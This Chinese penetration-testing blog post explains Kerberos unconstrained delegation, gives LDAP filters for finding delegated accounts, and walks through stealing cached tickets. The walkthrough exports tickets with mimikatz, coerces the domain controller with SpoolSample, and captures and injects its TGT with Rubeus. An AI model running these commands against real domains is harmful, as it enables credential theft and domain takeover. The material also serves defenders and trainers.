---
title: "Kerberos协议之非约束委派"
date: 2020-12-12T12:38:52+08:00
draft: false
tags:
- Kerberos
series:
- Windows协议
categories:
- 渗透测试
---

将我的权限给服务账户
<!--more-->
# 域委派
一句话概况，委派就是将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。**将我的权限给服务账户**。

需要注意的一点是接受委派的用户只能是服务账户或者计算机用户

一个经典的例子如图
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/1cc6f0a0-f0bb-a1f4-5263-bca883774e70.png)

jack需要登陆到后台文件服务器，经过Kerberos认证的过程如下：

1. jack以Kerberos协议认证登录，将凭证发送给websvc
2. websvc使用jack的凭证向KDC发起Kerberos申请TGT。
3. KDC检查websvc的委派属性，如果websvc可以委派，则返回可转发的jack的TGT。
4. websvc收到可转发TGT之后，使用该TGT向KDC申请可以访问后台文件服务器的TGS票据。
5. KDC检查websvc的委派属性，如果可以委派，并且权限允许，那么返回jack访问服务的TGS票据。
6. websvc使用jack的服务TGS票据请求后台文件服务器。

贴一个微软的官方流程图
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/07eb20a1-2424-e22a-6a39-a64f110f4023.png)


# 配置非约束委派

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/84ba30f9-91ab-65eb-9122-8f9a1400fe39.png)

`DM$`服务账户配置了非约束委派，那么它可以接受任意用户的委派去请求任意服务。

太过于抽象了，拿租房类比：

1. 任意用户就是租客
2. DM$服务账户是中介
3. 任意服务是房东

租客把自己的钱交给中介，中介拿着钱交给房东申请租房。那么这个过程中，DM$是拥有了任意用户的"钱"(凭证)的。

协议层面讲，用户A委派`DM$`访问WEB服务，那么用户会将TGT缓存在DM的lsass中，DM再模拟这个用户去访问服务。

# 寻找委派用户
1. 当服务账号或者主机被设置为非约束性委派时，其`userAccountControl`属性会包含`TRUSTED_FOR_DELEGATION`
2. 当服务账号或者主机被设置为约束性委派时，其`userAccountControl`属性包含`TRUSTED_TO_AUTH_FOR_DELEGATION`，且`msDS-AllowedToDelegateTo`属性会包含被约束的服务

在adsiedit.msc可以打开ADSI编辑器链接LDAP
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/9016f704-1fa8-da1c-b053-251572f6b764.png)

配置了非约束委派属性的账户增加了一个TRUSTED_TO_AUTH_FOR_DELEGATION的标志位，对应的值是0x80000，也即是524288。

可以用ldap查询筛选。查找域中配置非约束委派的用户：

```
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))
```
查找域中配置非约束委派的主机：

```
(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))
```

adfind和ldapsearch都可以查询。

# 利用
环境：DM可委派，DC是域控。

在DC上通过WinRM访问DM
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/cf01cf63-b139-53c0-5d74-fef2c99ce755.png)

此时DM上已经缓存了从DC登录过来的域管的ticket，mimikatz导出
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/2d794f8b-1ff0-0d92-f11e-7e590fb9848f.png)

ptt就完事了。实战中应该诱使DC访问我们的DM机器。

# 非约束委派+Spooler打印机服务
利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN `RpcRemoteFindFirstPrinterChangeNotification(Ex)`方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。

工具：https://github.com/leechristensen/SpoolSample

议题文章地址：https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory

需要以域用户运行SpoolSample，需要开启Print Spooler服务，该服务默认自启动。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/53f86e04-f7cf-95a9-7a55-dbe3e82a8e79.png)

```
SpoolSample.exe DC DM
```
使DC强制访问DM认证，同时使用rubeus监听来自DC的4624登录日志

```
Rubeus.exe monitor /interval:1 /filteruser:dc$
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/15ba6f30-6c3d-a7f3-f441-f38f0a3a23b4.png)

使用Rubues导入base64的ticket

```
.\Rubeus.exe ptt /ticket:base64
```

此时导出的ticket就有DC的TGT了
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f9ea712c-b722-c16f-180d-444733f1d322.png)

用mimikatz ptt就完事
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/5762ef23-682c-20a5-9836-4eef8567d7a2.png)

# 参考
1. https://xz.aliyun.com/t/7217
2. https://github.com/leechristensen/SpoolSample
3. https://www.cnblogs.com/zpchcbd/p/12939246.html
4. https://daiker.gitbook.io/windows-protocol/kerberos/2


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**